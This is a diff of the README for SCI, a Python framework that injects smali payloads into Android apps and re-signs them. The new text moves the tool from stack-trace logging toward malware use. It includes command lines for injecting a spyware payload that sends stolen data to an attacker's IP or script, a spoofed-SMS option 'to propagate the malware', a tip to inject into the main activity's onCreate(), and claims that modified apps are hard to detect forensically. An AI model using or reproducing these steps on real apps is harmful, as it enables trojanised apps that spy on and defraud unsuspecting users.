@@ -1,66 +1,67 @@
-![SCI](images/sci_logo.png)
-# Smali Code Injector 
-## Automate assembly code injections within Android applications. 
+![SCI](images/sci_logo.jpg)
+# Smali Code Injector
+## Automate assembly code (**smali**) injection within Android applications.
 
-The original purpose of this project was to automate the injection of stacktraces withing Andrdoid apps. Adding stacktraces helps in the process of reverse engineering and gives a good understanding of applications logic and workflow. Indeed, being able to obtain (log and print out) applications runtime method calls as well as the returned value would allow an attacker to save a considerable amount of time when reverse engineering complex Android applications and performing advanced code analysis. 
+The initial ambition of this project was to automate stack trace injections within Android applications in order to facilitate my master thesis work. Being able to log and display applications' runtime method calls along with their returned value greatly helps in reverse engineering complex applications by providing an insight into their logic and workflow. 
 
-Lately, I improved SCI by adding new features and payloads to attempt to fully automate assembly code injections. As a result I ended up with this highly customisable modular framework that allows the creation/use of any assembly payload. Consequently, a user familiar with Android development could use SCI to create its own module and automate its payload injection without having to worry about the registers dependancie, type, etc.
+Lately, new features and payloads were added in an attempt to create a framework fully capable of injecting any type of assembly code. Users familiar with Android development could easily implement compatible payloads. SCI is in charge of automating low level operation such as registers allocation, dependancie, type, etc. 
 
-More information about reverse engineering Android apps:
+**Tampering Android applications has never been that easy!**
+
+More information about Android reverse engineering can be found at:
 
 <http://www.n00blinuxhacker.com/android-pentesting-reverse-engineering-android-app.html>
 
-### Automation for a better world
-The code injection is performed at the assembly level (smali files). Which makes the identification of applications modified using SCI complicated and time consuming. This would require considerable of work (mainly network, permissions, signature and code analysis).
+### Automation for a simpler world
+Code injections are performed at the assembly level (smali files) which make the process of differenciation between legit and modified applications complicated and time consuming - it would require considerable forensic work such as network, permissions, signature and code analysis -.
 
-A high level overview of the different steps performed by SCI when injecting codes are:
-* Disassembling the application
-* Collecting relevant information about the application. 
+A high level overview of the steps involved during code injection is:
+1. Disassembling the application
+2. Collecting relevant information about the application. 
 	* Classes name.
 	* Methods name.
 	* Registers number and type.
 	* etc.
-* Editing the AndroidManifest.xml to add permissions, services and broadcastReceivers (depending on the payload requirements).
-* Injecting and tweaking up the selected payload within the targeted method(s).
-* Reassembling and signing the app with a valid self-signed certificate.
+3. Editing the AndroidManifest.xml to add permissions, services and broadcastReceivers (depending on the payload requirements).
+4. Injecting and tweaking up the selected payload within the targeted method(s).
+5. Reassembling and signing the app with a valid self-signed certificate.
 
 ## Usage
 ### Examples:
-To inject a payload:
+Generic usage:
 
-		$ python3 sci.py -a [app] -t [target] -k [keyword] -p [payload] -rh [remote_host] -d [download_link]
-	[-a]: 	Android applicaion to modify.
-	[-t]: 	smali file within the application where to perform the injection. If this argument is absent, the injection is performed within the whole app.
-	[-k]: 	keywords to filter on. Ex: if -k "SSL,X509TrustManager" the payload will only be injected on the method containing SSL in their declaration header -help for certificate unpinning-.
-	[-p]: 	payload to use. 
+		$ python3 sci.py -a [app] -t [target] -k [keyword] -p [payload] -rh [remote_host] -ppg [spoofed_SMS]
+	[-a]: 	applicaion to modify.
+	[-t]: 	directory/file where to recursively perform the injection. If this argument is absent, the injection is performed within the whole app.
+	[-k]: 	keywords to filter on. Ex: if -k "SSL,X509TrustManager" the payload will only be injected on the method containing SSL in their declaration header - **help for certificate unpinning** -.
+	[-p]: 	payload to inject. 
+	[-ppg]:	spoofed SMS content to send - **to propagate the malware** -.
 	[-rh]:  IP address of the attacker/script for sending the stolen data.
-	[-d]:	link to download the malicious app -to propagate the malware-.
 
-	Tip: Inject the rat on the onCreate() method of the main activity
+Spyware usage:
 
-To inject the Spyware:
+		$ python3 sci.py -a [app] -t [target] -k [keyword] -p *spyware* -rh [script] -ppg [spoofed_SMS]
+    
+    [-ppg]:	link with the malicious app. 
+	[-rh]: 	IP of the remote receiver (or URL of the file responsible for the JSON data handling and parsing (a script example can be found under /scripts/handler.php - do not forget to change the settings to connect to your DB -).
 
-		$ python3 sci.py -a [app] -t [target] -k [keyword] -p spyware -rh [script] -d [download_link]
+	**Tip**: Inject the Spyware on the **onCreate()** method of the main activity.
 
-	
-	[-rh]: 	IP of the remote receiver (or URL of the file responsible for the JSON data handling and parsing (a script example can be found under /scripts/handler.php -don't forget to change the settings to connect to your DB-).
-    [-d]:	link with the malicious app. 
+Logger usage:
 
-To inject the Logger:
+		$ python3 sci.py -a [app] -t [target] -k [keyword] -p *logger*
 
-		$ python3 sci.py -a [app] -t [target] -k [keyword] -p logger
-
-	Note: Connect your phone to your computer and use the following command to filter and print out only the modified app runtime method calls:
+	**Note**: Connect your phone to your computer and use the following command to filter and print out only the modified app runtime method calls:
 
 		$ adb logcat | grep "::trace
 
-To identify the main activity location (works even with obfuscated app):
+Identify the main activity (works with obfuscated app):
 
 		$ python3 sci.py -a [apps] -s
 		
-To display the help menu:
+Display the help menu:
 
-		$ python3 sci.py  -h
+		$ python3 sci.py -h
 
 ## Dependencies
 ### Third-party libraries
